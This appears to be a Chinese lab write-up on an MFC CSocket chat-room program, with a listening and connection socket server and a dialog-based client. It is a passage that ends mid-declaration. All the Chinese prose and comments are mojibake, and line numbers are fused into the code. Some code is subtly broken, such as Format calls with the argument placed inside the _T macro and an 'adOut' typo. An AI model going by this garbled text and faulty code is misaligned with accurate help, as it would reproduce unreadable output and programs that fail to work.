åˆ›å»ºå¥—æ¥å­—å¯¹è±¡åº•å±‚å¥æŸ„ 1sockClient.Create(); è¯·æ±‚è¿æ¥åˆ°æœåŠ¡å™¨ 1sockClient.Connect(strAddr,nPort); åˆ›å»ºæ–‡ä»¶å¯¹è±¡å¹¶å…³è”åˆ°å¥—æ¥å­—å¯¹è±¡ 12CSocketFile* m_pFile; //å®šä¹‰ä¸€ä¸ªCSocketFileå¯¹è±¡æŒ‡é’ˆfile = new CSocketFile(&amp;sockClient); æ¶ˆæ¯çš„ä¼ é€ 1234CArchive* arIn,arOut;arIn = CArchive(&amp;file,CArchive::load); //åˆ›å»ºç”¨äºè¾“å…¥çš„CArchiveå¯¹è±¡arOut = CArchive(&amp;file,CArchive::store); //åˆ›å»ºç”¨äºè¾“å‡ºçš„CArchiveå¯¹è±¡//CArchiveå¯¹è±¡éœ€è¦å…³è”åˆ°æ–‡ä»¶å¯¹è±¡ 12arIn &gt;&gt; dwValue; //è¿›è¡Œæ•°æ®è¾“å…¥adOut &lt;&lt; dwValue; //æ•°æ®è¾“å‡º å…³é—­å¥—æ¥å­— 1sockClient.Close(); æœåŠ¡å™¨ç«¯ï¼šåˆ›å»ºç›‘å¬å¥—æ¥å­—å¯¹è±¡çš„æ—¶å€™ï¼Œè¦ç”¨ä¼—æ‰€å‘¨çŸ¥çš„ä¿ç•™ç«¯å£å· æœåŠ¡å™¨ç«¯ï¼šæ”¶åˆ°è¿æ¥è¯·æ±‚ä¹‹åï¼Œéœ€è¦åˆ›å»ºä¸€ä¸ªä¸“é—¨ç”¨äºè¿æ¥çš„å¥—æ¥å­—å¯¹è±¡ã€‚ï¼ˆå³æ¯ä¸ªä¸æœåŠ¡å™¨è¿æ¥çš„å®¢æˆ·ç«¯éƒ½æœ‰ä¸€ä¸ªä¸“å±çš„ç”¨äºè¿æ¥å’Œæ•°æ®äº¤æ¢çš„å¥—æ¥å­—å¯¹è±¡ï¼‰ å®éªŒè¿‡ç¨‹ï¼ˆä»£ç åˆ†æï¼‰ğŸ‘‰åˆ›é€ ç¨‹åºæ¡†æ¶ ï¼ˆMFCåŸºäºå¯¹è¯æ¡†ï¼‰ ğŸ‘‰æ·»åŠ æ§ä»¶å¯¹è±¡ ğŸ‘‰æ·»åŠ æ§ä»¶æˆå‘˜å˜é‡ CSocketç±»ä»CAsynSocketç±»ç»§æ‰¿äº†è®¸å¤šæˆå‘˜å‡½æ•°ï¼Œå°è£…äº†Windowså¥—æ¥å­—åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£APIã€‚ åº”ç”¨ç¨‹åºç±»CTsAppã€CTcAppå¯¹åº”æ–‡ä»¶VC++è‡ªåŠ¨ç”Ÿæˆ ###æ´¾ç”Ÿç±»CLSocketã€CCSocketå¯¹åº”æ–‡ä»¶ æœåŠ¡å™¨ç«¯ï¼š CLSocketï¼Œä¸“ç”¨äºç›‘å¬å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚ï¼ˆæ·»åŠ OnAcceptäº‹ä»¶å¤„ç†å‡½æ•°ï¼‰ CCSocketï¼Œä¸“ç”¨äºå®¢æˆ·ç«¯å»ºç«‹è¿æ¥å¹¶äº¤æ¢æ•°æ®ï¼ˆæ·»åŠ OnReceiveäº‹ä»¶å¤„ç†å‡½æ•°ï¼‰ æ·»åŠ äº‹ä»¶å“åº”å‡½æ•°ï¼Œç”¨äºåœæ­¢æœåŠ¡ã€å’Œç›‘å¬ âœï¸LSocket.h 123456789101112#pragma onceclass CTsDlg;class CLSocket : public CSocket&#123; DECLARE_DYNAMIC(CLSocket);public: CLSocket(CTsDlg* m_pDlg); virtual ~CLSocket(); CTsDlg* m_pDlg;protected: virtual void OnAccept(int nErrorCode);&#125;; âœï¸LSocket.cpp 1234567891011121314151617181920#include &quot;pch.h&quot;#include &quot;LSocket.h&quot;#include &quot;tsDlg.h&quot;CLSocket::CLSocket(CTsDlg* pDlg)&#123; m_pDlg = pDlg;&#125;CLSocket::~CLSocket()&#123; m_pDlg = NULL;&#125;void CLSocket::OnAccept(int nErrorCode)&#123; CSocket::OnAccept(nErrorCode); m_pDlg-&gt;OnAccept();&#125;IMPLEMENT_DYNAMIC(CLSocket, CSocket) âœï¸CSocket.h 123456789101112131415161718192021222324#pragma onceclass CTsDlg;class CMsg;class CCSocket:public CSocket&#123; DECLARE_DYNAMIC(CCSocket);public: CCSocket(CTsDlg* pDlg); virtual ~CCSocket();public: CTsDlg* m_pDlg; CSocketFile* m_pFile; CArchive* m_pArchiveIn; CArchive* m_pArchiveOut;public: void Initialize(); void SendMessage(CMsg* pMsg); void ReceiveMessage(CMsg* pMsg);protected: virtual void OnReceive(int nErrorCode);&#125;; âœï¸CSocket.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &quot;pch.h&quot;#include &quot;CSocket.h&quot;#include &quot;tsDlg.h&quot;#include &quot;Msg.h&quot;CCSocket::CCSocket(CTsDlg* pDlg)&#123; m_pDlg = pDlg; m_pFile = NULL; m_pArchiveIn = NULL; m_pArchiveOut = NULL;&#125;CCSocket::~CCSocket()&#123; m_pDlg = NULL; if (m_pArchiveOut != NULL) delete m_pArchiveOut; if (m_pArchiveIn != NULL) delete m_pArchiveIn; if (m_pFile != NULL) delete m_pFile;&#125;void CCSocket::Initialize()&#123; m_pFile = new CSocketFile(this, TRUE); m_pArchiveIn = new CArchive(m_pFile, CArchive::load); m_pArchiveOut = new CArchive(m_pFile, CArchive::store);&#125;void CCSocket::SendMessage(CMsg* pMsg)&#123; if (m_pArchiveOut != NULL) &#123; pMsg-&gt;Serialize(*m_pArchiveOut); m_pArchiveOut-&gt;Flush(); &#125;&#125;void CCSocket::ReceiveMessage(CMsg* pMsg)&#123; pMsg-&gt;Serialize(*m_pArchiveIn);&#125;void CCSocket::OnReceive(int nErrorCode)&#123; CSocket::OnReceive(nErrorCode); m_pDlg-&gt;OnReceive(this);&#125;IMPLEMENT_DYNAMIC(CCSocket,CSocket) å®¢æˆ·ç«¯: CCSocketï¼Œä¸“ç”¨äºäºæœåŠ¡å™¨å»ºç«‹è¿æ¥å¹¶äº¤æ¢æ•°æ®ï¼ˆæ·»åŠ OnReceiveäº‹ä»¶å¤„ç†å‡½æ•°ï¼‰ âœï¸CSocket.h 1234567891011121314#pragma onceclass CTcDlg;class CCSocket:public CSocket&#123; DECLARE_DYNAMIC(CCSocket);public: CCSocket(CTcDlg* pDlg); virtual ~CCSocket(); CTcDlg* m_pDlg;protected: virtual void OnReceive(int nErrorCode);&#125;; âœï¸CSocket.cpp 1234567891011121314151617181920#include &quot;pch.h&quot;#include &quot;CSocket.h&quot;#include &quot;tcDlg.h&quot;IMPLEMENT_DYNAMIC(CCSocket,CSocket)CCSocket::CCSocket(CTcDlg* pDlg)&#123; m_pDlg = pDlg;&#125;CCSocket::~CCSocket()&#123; m_pDlg = NULL;&#125;void CCSocket::OnReceive(int nErrorCode)&#123; CSocket::OnReceive(nErrorCode); if (nErrorCode == 0) m_pDlg-&gt;OnReceive();&#125; å¯¹è¯æ¡†ç±»CTsDlgã€CTcDlgå¯¹åº”æ–‡ä»¶ä¸»è¦æ˜¯å¯¹æ§ä»¶å˜é‡çš„å£°æ˜å’Œå®šä¹‰ã€‚ æœåŠ¡å™¨ç«¯ï¼š âœï¸tsDlg.h 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// tsDlg.h: å¤´æ–‡ä»¶//#pragma once#include &quot;CSocket.h&quot;#include &quot;LSocket.h&quot;class CMsg;// CTsDlg å¯¹è¯æ¡†class CTsDlg : public CDialogEx&#123;// æ„é€ public: CTsDlg(CWnd* pParent = nullptr); // æ ‡å‡†æ„é€ å‡½æ•°// å¯¹è¯æ¡†æ•°æ®#ifdef AFX_DESIGN_TIME enum &#123; IDD = IDD_TS_DIALOG &#125;;#endif protected: virtual void DoDataExchange(CDataExchange* pDX); // DDX/DDV æ”¯æŒ// å®ç°protected: HICON m_hIcon; // ç”Ÿæˆçš„æ¶ˆæ¯æ˜ å°„å‡½æ•° virtual BOOL OnInitDialog(); afx_msg void OnSysCommand(UINT nID, LPARAM lParam); afx_msg void OnPaint(); afx_msg HCURSOR OnQueryDragIcon(); DECLARE_MESSAGE_MAP()public: CStatic m_staNum; CButton m_btnListen; CButton m_btnClose; CListBox m_listMsg; UINT m_nPort; afx_msg void OnButtonListen(); afx_msg void OnClose(); // ç”Ÿæˆçš„æ¶ˆæ¯æ˜ å°„å‡½æ•° public: CLSocket* m_pLSocket; CPtrList m_connList; void OnAccept(); void OnReceive(CCSocket* pSocket); void backClients(CMsg* pMsg);&#125;; âœï¸tsDlg.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273// tsDlg.cpp: å®ç°æ–‡ä»¶//#include &quot;pch.h&quot;#include &quot;framework.h&quot;#include &quot;ts.h&quot;#include &quot;tsDlg.h&quot;#include &quot;afxdialogex.h&quot;#include &quot;Msg.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#endif// ç”¨äºåº”ç”¨ç¨‹åºâ€œå…³äºâ€èœå•é¡¹çš„ CAboutDlg å¯¹è¯æ¡†class CAboutDlg : public CDialogEx&#123;public: CAboutDlg();// å¯¹è¯æ¡†æ•°æ®#ifdef AFX_DESIGN_TIME enum &#123; IDD = IDD_ABOUTBOX &#125;;#endif protected: virtual void DoDataExchange(CDataExchange* pDX); // DDX/DDV æ”¯æŒ// å®ç°protected: DECLARE_MESSAGE_MAP()&#125;;CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)&#123;&#125;void CAboutDlg::DoDataExchange(CDataExchange* pDX)&#123; CDialogEx::DoDataExchange(pDX);&#125;BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)END_MESSAGE_MAP()// CTsDlg å¯¹è¯æ¡†CTsDlg::CTsDlg(CWnd* pParent /*=nullptr*/) : CDialogEx(IDD_TS_DIALOG, pParent) &#123; m_nPort = 0; m_hIcon = AfxGetApp()-&gt;LoadIcon(IDR_MAINFRAME); m_pLSocket = NULL;&#125;void CTsDlg::DoDataExchange(CDataExchange* pDX)&#123; CDialogEx::DoDataExchange(pDX); DDX_Control(pDX, IDC_STATIC_NUM, m_staNum); DDX_Text(pDX, IDC_EDIT_PORT, m_nPort); DDX_Control(pDX, IDC_BUTTON_LISTEN, m_btnListen); DDX_Control(pDX, IDOK, m_btnClose); DDX_Control(pDX, IDC_LIST_MSG, m_listMsg);&#125;BEGIN_MESSAGE_MAP(CTsDlg, CDialogEx) ON_WM_SYSCOMMAND() ON_WM_PAINT() ON_WM_QUERYDRAGICON() ON_BN_CLICKED(IDOK, &amp;CTsDlg::OnClose) ON_BN_CLICKED(IDC_BUTTON_LISTEN, &amp;CTsDlg::OnButtonListen)END_MESSAGE_MAP()// CTsDlg æ¶ˆæ¯å¤„ç†ç¨‹åºBOOL CTsDlg::OnInitDialog()&#123; CDialogEx::OnInitDialog(); // å°†â€œå…³äº...â€èœå•é¡¹æ·»åŠ åˆ°ç³»ç»Ÿèœå•ä¸­ã€‚ // IDM_ABOUTBOX å¿…é¡»åœ¨ç³»ç»Ÿå‘½ä»¤èŒƒå›´å†…ã€‚ ASSERT((IDM_ABOUTBOX &amp; 0xFFF0) == IDM_ABOUTBOX); ASSERT(IDM_ABOUTBOX &lt; 0xF000); CMenu* pSysMenu = GetSystemMenu(FALSE); if (pSysMenu != nullptr) &#123; BOOL bNameValid; CString strAboutMenu; bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX); ASSERT(bNameValid); if (!strAboutMenu.IsEmpty()) &#123; pSysMenu-&gt;AppendMenu(MF_SEPARATOR); pSysMenu-&gt;AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu); &#125; &#125; // è®¾ç½®æ­¤å¯¹è¯æ¡†çš„å›¾æ ‡ã€‚ å½“åº”ç”¨ç¨‹åºä¸»çª—å£ä¸æ˜¯å¯¹è¯æ¡†æ—¶ï¼Œæ¡†æ¶å°†è‡ªåŠ¨ // æ‰§è¡Œæ­¤æ“ä½œ SetIcon(m_hIcon, TRUE); // è®¾ç½®å¤§å›¾æ ‡ SetIcon(m_hIcon, FALSE); // è®¾ç½®å°å›¾æ ‡ // TODO: åœ¨æ­¤æ·»åŠ é¢å¤–çš„åˆå§‹åŒ–ä»£ç  m_nPort = 8000; UpdateData(FALSE); GetDlgItem(IDOK)-&gt;EnableWindow(FALSE); return TRUE; // é™¤éå°†ç„¦ç‚¹è®¾ç½®åˆ°æ§ä»¶ï¼Œå¦åˆ™è¿”å› TRUE&#125;void CTsDlg::OnSysCommand(UINT nID, LPARAM lParam)&#123; if ((nID &amp; 0xFFF0) == IDM_ABOUTBOX) &#123; CAboutDlg dlgAbout; dlgAbout.DoModal(); &#125; else &#123; CDialogEx::OnSysCommand(nID, lParam); &#125;&#125;// å¦‚æœå‘å¯¹è¯æ¡†æ·»åŠ æœ€å°åŒ–æŒ‰é’®ï¼Œåˆ™éœ€è¦ä¸‹é¢çš„ä»£ç // æ¥ç»˜åˆ¶è¯¥å›¾æ ‡ã€‚ å¯¹äºä½¿ç”¨æ–‡æ¡£/è§†å›¾æ¨¡å‹çš„ MFC åº”ç”¨ç¨‹åºï¼Œ// è¿™å°†ç”±æ¡†æ¶è‡ªåŠ¨å®Œæˆã€‚void CTsDlg::OnPaint()&#123; if (IsIconic()) &#123; CPaintDC dc(this); // ç”¨äºç»˜åˆ¶çš„è®¾å¤‡ä¸Šä¸‹æ–‡ SendMessage(WM_ICONERASEBKGND, reinterpret_cast&lt;WPARAM&gt;(dc.GetSafeHdc()), 0); // ä½¿å›¾æ ‡åœ¨å·¥ä½œåŒºçŸ©å½¢ä¸­å±…ä¸­ int cxIcon = GetSystemMetrics(SM_CXICON); int cyIcon = GetSystemMetrics(SM_CYICON); CRect rect; GetClientRect(&amp;rect); int x = (rect.Width() - cxIcon + 1) / 2; int y = (rect.Height() - cyIcon + 1) / 2; // ç»˜åˆ¶å›¾æ ‡ dc.DrawIcon(x, y, m_hIcon); &#125; else &#123; CDialogEx::OnPaint(); &#125;&#125;//å½“ç”¨æˆ·æ‹–åŠ¨æœ€å°åŒ–çª—å£æ—¶ç³»ç»Ÿè°ƒç”¨æ­¤å‡½æ•°å–å¾—å…‰æ ‡//æ˜¾ç¤ºã€‚HCURSOR CTsDlg::OnQueryDragIcon()&#123; return (HCURSOR) m_hIcon;&#125;void CTsDlg::OnClose()&#123; CMsg msg; msg.m_strText = &quot;æœåŠ¡å™¨ç»ˆæ­¢æœåŠ¡ï¼&quot;; delete m_pLSocket; m_pLSocket = NULL; while (!m_connList.IsEmpty()) &#123; CCSocket* pSocket = (CCSocket*)m_connList.RemoveHead(); pSocket-&gt;SendMessage(&amp;msg); delete pSocket; &#125; while (m_listMsg.GetCount() != 0) m_listMsg.DeleteString(0); GetDlgItem(IDC_EDIT_PORT)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_BUTTON_LISTEN)-&gt;EnableWindow(TRUE); GetDlgItem(IDOK)-&gt;EnableWindow(FALSE);&#125;void CTsDlg::OnButtonListen()&#123; UpdateData(TRUE); m_pLSocket = new CLSocket(this); if (!m_pLSocket-&gt;Create(m_nPort)) &#123; delete m_pLSocket; m_pLSocket = NULL; AfxMessageBox(_T(&quot;åˆ›å»ºç›‘å¬å¥—æ¥å­—é”™è¯¯ï¼&quot;)); return; &#125; if (!m_pLSocket-&gt;Listen()) &#123; delete m_pLSocket; m_pLSocket = NULL; AfxMessageBox(_T(&quot;å¯åŠ¨ç›‘å¬é”™è¯¯ï¼&quot;)); return; &#125; GetDlgItem(IDC_EDIT_PORT)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_BUTTON_LISTEN)-&gt;EnableWindow(FALSE); GetDlgItem(IDOK)-&gt;EnableWindow(TRUE);&#125;void CTsDlg::OnAccept()&#123; CCSocket* pSocket = new CCSocket(this); if (m_pLSocket-&gt;Accept(*pSocket)) &#123; pSocket-&gt;Initialize(); m_connList.AddTail(pSocket); CString strTemp; strTemp.Format(_T(&quot;åœ¨çº¿äººæ•°ï¼š%d&quot;, m_connList.GetCount())); m_staNum.SetWindowText(strTemp); &#125; else delete pSocket;&#125;void CTsDlg::OnReceive(CCSocket* pSocket)&#123; static CMsg msg; do &#123; pSocket-&gt;ReceiveMessage(&amp;msg); m_listMsg.AddString(msg.m_strText); backClients(&amp;msg); if (msg.m_bClose) &#123; pSocket-&gt;Close(); POSITION pos, temp; for (pos = m_connList.GetHeadPosition(); pos != NULL;) &#123; temp = pos; CCSocket* pSock = (CCSocket*)m_connList.GetNext(pos); if (pSock == pSocket) &#123; m_connList.RemoveAt(temp); CString strTemp; strTemp.Format((_T(&quot;åœ¨çº¿äººæ•°ï¼š%d&quot;, m_connList.GetCount()))); m_staNum.SetWindowText(strTemp); break; &#125; &#125; delete pSocket; break; &#125; &#125; while (!pSocket-&gt;m_pArchiveIn-&gt;IsBufferEmpty());&#125;void CTsDlg::backClients(CMsg* pMsg)&#123; for (POSITION pos = m_connList.GetHeadPosition(); pos != NULL;) &#123; CCSocket* pSocket = (CCSocket*)m_connList.GetNext(pos); pSocket-&gt;SendMessage(pMsg); &#125;&#125; å®¢æˆ·ç«¯ï¼š âœï¸tcDlg.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// tcDlg.h: å¤´æ–‡ä»¶//#include &quot;CSocket.h&quot;#pragma once// CTcDlg å¯¹è¯æ¡†class CTcDlg : public CDialogEx&#123;// æ„é€ public: CTcDlg(CWnd* pParent = nullptr); // æ ‡å‡†æ„é€ å‡½æ•°// å¯¹è¯æ¡†æ•°æ®#ifdef AFX_DESIGN_TIME enum &#123; IDD = IDD_TC_DIALOG &#125;;#endif protected: virtual void DoDataExchange(CDataExchange* pDX); // DDX/DDV æ”¯æŒ// å®ç°protected: HICON m_hIcon; // ç”Ÿæˆçš„æ¶ˆæ¯æ˜ å°„å‡½æ•° virtual BOOL OnInitDialog(); afx_msg void OnSysCommand(UINT nID, LPARAM lParam); afx_msg void OnPaint(); afx_msg HCURSOR OnQueryDragIcon(); DECLARE_MESSAGE_MAP()public: afx_msg void OnEnChangeEditCname(); afx_msg void OnEnChangeEdit2(); CButton m_btnClose; CString m_strCName; CString m_strSName; UINT m_nPort; CString m_strMsg; CButton m_btnConn; CButton m_Send; CListBox m_listMsg; afx_msg void OnSend(); afx_msg void OnButtonConn(); afx_msg void OnButtonClose(); afx_msg void OnDestroy(); CCSocket* m_pSocket; CSocketFile* m_pFile; CArchive* m_pArchiveIn; CArchive* m_pArchiveOut; void OnReceive(); void ReceiveMsg(); void SendMsg(CString&amp; strText, bool st);&#125;; âœï¸tcDlg.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363// tcDlg.cpp: å®ç°æ–‡ä»¶//#include &quot;pch.h&quot;#include &quot;framework.h&quot;#include &quot;tc.h&quot;#include &quot;tcDlg.h&quot;#include &quot;afxdialogex.h&quot;#include &quot;CSocket.h&quot;#include &quot;Msg.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#endif// ç”¨äºåº”ç”¨ç¨‹åºâ€œå…³äºâ€èœå•é¡¹çš„ CAboutDlg å¯¹è¯æ¡†class CAboutDlg : public CDialogEx&#123;public: CAboutDlg();// å¯¹è¯æ¡†æ•°æ®#ifdef AFX_DESIGN_TIME enum &#123; IDD = IDD_ABOUTBOX &#125;;#endif protected: virtual void DoDataExchange(CDataExchange* pDX); // DDX/DDV æ”¯æŒ// å®ç°protected: DECLARE_MESSAGE_MAP()&#125;;CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)&#123;&#125;void CAboutDlg::DoDataExchange(CDataExchange* pDX)&#123; CDialogEx::DoDataExchange(pDX);&#125;BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)END_MESSAGE_MAP()// CTcDlg å¯¹è¯æ¡†CTcDlg::CTcDlg(CWnd* pParent /*=nullptr*/) : CDialogEx(IDD_TC_DIALOG, pParent)&#123; m_strCName=_T(&quot;&quot;); m_strSName=_T(&quot;&quot;); m_nPort = 0; m_strMsg=_T(&quot;&quot;); m_hIcon = AfxGetApp()-&gt;LoadIcon(IDR_MAINFRAME); m_pSocket = NULL; m_pFile = NULL; m_pArchiveIn = NULL; m_pArchiveOut = NULL;&#125;void CTcDlg::DoDataExchange(CDataExchange* pDX)&#123; CDialogEx::DoDataExchange(pDX); DDX_Control(pDX, IDC_BUTTON_CLOSE, m_btnClose); DDX_Text(pDX, IDC_EDIT_CNAME, m_strCName); DDX_Text(pDX, IDC_EDIT_SNAME, m_strSName); DDX_Text(pDX, IDC_EDIT_PORT, m_nPort); DDX_Text(pDX, IDC_EDIT_MSG, m_strMsg); DDX_Control(pDX, IDC_BUTTON_CONN, m_btnConn); DDX_Control(pDX, IDOK, m_Send); DDX_Control(pDX, IDC_LIST_MSG, m_listMsg);&#125;BEGIN_MESSAGE_MAP(CTcDlg, CDialogEx) ON_WM_SYSCOMMAND() ON_WM_PAINT() ON_WM_QUERYDRAGICON() //ON_EN_CHANGE(IDC_EDIT2, &amp;CTcDlg::OnEnChangeEdit2) ON_BN_CLICKED(IDOK, &amp;CTcDlg::OnSend) ON_BN_CLICKED(IDC_BUTTON_CONN, &amp;CTcDlg::OnButtonConn) ON_BN_CLICKED(IDC_BUTTON_CLOSE, &amp;CTcDlg::OnButtonClose) ON_WM_DESTROY()END_MESSAGE_MAP()// CTcDlg æ¶ˆæ¯å¤„ç†ç¨‹åºBOOL CTcDlg::OnInitDialog()&#123; CDialogEx::OnInitDialog(); // å°†â€œå…³äº...â€èœå•é¡¹æ·»åŠ åˆ°ç³»ç»Ÿèœå•ä¸­ã€‚ // IDM_ABOUTBOX å¿…é¡»åœ¨ç³»ç»Ÿå‘½ä»¤èŒƒå›´å†…ã€‚ ASSERT((IDM_ABOUTBOX &amp; 0xFFF0) == IDM_ABOUTBOX); ASSERT(IDM_ABOUTBOX &lt; 0xF000); CMenu* pSysMenu = GetSystemMenu(FALSE); if (pSysMenu != nullptr) &#123; BOOL bNameValid; CString strAboutMenu; bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX); ASSERT(bNameValid); if (!strAboutMenu.IsEmpty()) &#123; pSysMenu-&gt;AppendMenu(MF_SEPARATOR); pSysMenu-&gt;AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu); &#125; &#125; // è®¾ç½®æ­¤å¯¹è¯æ¡†çš„å›¾æ ‡ã€‚ å½“åº”ç”¨ç¨‹åºä¸»çª—å£ä¸æ˜¯å¯¹è¯æ¡†æ—¶ï¼Œæ¡†æ¶å°†è‡ªåŠ¨ // æ‰§è¡Œæ­¤æ“ä½œ SetIcon(m_hIcon, TRUE); // è®¾ç½®å¤§å›¾æ ‡ SetIcon(m_hIcon, FALSE); // è®¾ç½®å°å›¾æ ‡ // TODO: åœ¨æ­¤æ·»åŠ é¢å¤–çš„åˆå§‹åŒ–ä»£ç  m_strCName = _T(&quot;å®¢æˆ· 1&quot;); m_nPort = 8000; m_strSName = _T(&quot;localhost&quot;); GetDlgItem(IDC_EDIT_MSG)-&gt;EnableWindow(FALSE); GetDlgItem(IDOK)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_BUTTON_CLOSE)-&gt;EnableWindow(FALSE); UpdateData(FALSE); return TRUE; // é™¤éå°†ç„¦ç‚¹è®¾ç½®åˆ°æ§ä»¶ï¼Œå¦åˆ™è¿”å› TRUE&#125;void CTcDlg::OnSysCommand(UINT nID, LPARAM lParam)&#123; if ((nID &amp; 0xFFF0) == IDM_ABOUTBOX) &#123; CAboutDlg dlgAbout; dlgAbout.DoModal(); &#125; else &#123; CDialogEx::OnSysCommand(nID, lParam); &#125;&#125;// å¦‚æœå‘å¯¹è¯æ¡†æ·»åŠ æœ€å°åŒ–æŒ‰é’®ï¼Œåˆ™éœ€è¦ä¸‹é¢çš„ä»£ç // æ¥ç»˜åˆ¶è¯¥å›¾æ ‡ã€‚ å¯¹äºä½¿ç”¨æ–‡æ¡£/è§†å›¾æ¨¡å‹çš„ MFC åº”ç”¨ç¨‹åºï¼Œ// è¿™å°†ç”±æ¡†æ¶è‡ªåŠ¨å®Œæˆã€‚void CTcDlg::OnPaint()&#123; if (IsIconic()) &#123; CPaintDC dc(this); // ç”¨äºç»˜åˆ¶çš„è®¾å¤‡ä¸Šä¸‹æ–‡ SendMessage(WM_ICONERASEBKGND, reinterpret_cast&lt;WPARAM&gt;(dc.GetSafeHdc()), 0); // ä½¿å›¾æ ‡åœ¨å·¥ä½œåŒºçŸ©å½¢ä¸­å±…ä¸­ int cxIcon = GetSystemMetrics(SM_CXICON); int cyIcon = GetSystemMetrics(SM_CYICON); CRect rect; GetClientRect(&amp;rect); int x = (rect.Width() - cxIcon + 1) / 2; int y = (rect.Height() - cyIcon + 1) / 2; // ç»˜åˆ¶å›¾æ ‡ dc.DrawIcon(x, y, m_hIcon); &#125; else &#123; CDialogEx::OnPaint(); &#125;&#125;//å½“ç”¨æˆ·æ‹–åŠ¨æœ€å°åŒ–çª—å£æ—¶ç³»ç»Ÿè°ƒç”¨æ­¤å‡½æ•°å–å¾—å…‰æ ‡//æ˜¾ç¤ºã€‚HCURSOR CTcDlg::OnQueryDragIcon()&#123; return static_cast&lt;HCURSOR&gt;(m_hIcon);&#125;void CTcDlg::OnEnChangeEdit2()&#123; // TODO: å¦‚æœè¯¥æ§ä»¶æ˜¯ RICHEDIT æ§ä»¶ï¼Œå®ƒå°†ä¸ // å‘é€æ­¤é€šçŸ¥ï¼Œé™¤éé‡å†™ CDialogEx::OnInitDialog() // å‡½æ•°å¹¶è°ƒç”¨ CRichEditCtrl().SetEventMask()ï¼Œ // åŒæ—¶å°† ENM_CHANGE æ ‡å¿—â€œæˆ–â€è¿ç®—åˆ°æ©ç ä¸­ã€‚ // TODO: åœ¨æ­¤æ·»åŠ æ§ä»¶é€šçŸ¥å¤„ç†ç¨‹åºä»£ç &#125;void CTcDlg::OnSend()&#123; // TODO: åœ¨æ­¤æ·»åŠ æ§ä»¶é€šçŸ¥å¤„ç†ç¨‹åºä»£ç  UpdateData(TRUE); if (!m_strMsg.IsEmpty()) &#123; this-&gt;SendMsg(m_strCName + (_T(&quot;ï¼š&quot;)) + m_strMsg, FALSE); m_strMsg = _T(&quot;&quot;); UpdateData(FALSE); &#125;&#125;void CTcDlg::OnButtonConn()&#123; m_pSocket = new CCSocket(this); if (!m_pSocket-&gt;Create()) &#123; delete m_pSocket; m_pSocket = NULL; AfxMessageBox(_T(&quot;å¥—æ¥å­—åˆ›å»ºé”™è¯¯ï¼&quot;)); return; &#125; if (!m_pSocket-&gt;Connect(m_strSName, m_nPort)) &#123; delete m_pSocket; m_pSocket = NULL; AfxMessageBox(_T(&quot;æ— æ³•è¿æ¥æœåŠ¡å™¨é”™è¯¯ï¼&quot;)); return; &#125; m_pFile = new CSocketFile(m_pSocket); m_pArchiveIn = new CArchive(m_pFile, CArchive::load); m_pArchiveOut = new CArchive(m_pFile, CArchive::store); UpdateData(TRUE); CString strTemp; strTemp = m_strCName +(_T( &quot;:è¿›å…¥èŠå¤©å®¤&quot;)); SendMsg(strTemp, FALSE); GetDlgItem(IDC_EDIT_MSG)-&gt;EnableWindow(TRUE); GetDlgItem(IDOK)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_BUTTON_CLOSE)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_EDIT_CNAME)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_EDIT_SNAME)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_EDIT_PORT)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_BUTTON_CONN)-&gt;EnableWindow(FALSE);&#125;void CTcDlg::OnButtonClose()&#123; CString strTemp; strTemp = m_strCName + (_T(&quot;ï¼šç¦»å¼€èŠå¤©å®¤&quot;)); SendMsg(strTemp, TRUE); delete m_pArchiveOut; m_pArchiveOut = NULL; delete m_pArchiveIn; m_pArchiveIn = NULL; delete m_pFile; m_pFile = NULL; m_pSocket-&gt;Close(); delete m_pSocket; m_pSocket = NULL; while (m_listMsg.GetCount() != 0) m_listMsg.DeleteString(0); GetDlgItem(IDC_EDIT_MSG)-&gt;EnableWindow(FALSE); GetDlgItem(IDOK)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_BUTTON_CLOSE)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_EDIT_CNAME)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_EDIT_SNAME)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_EDIT_PORT)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_BUTTON_CONN)-&gt;EnableWindow(TRUE);&#125;void 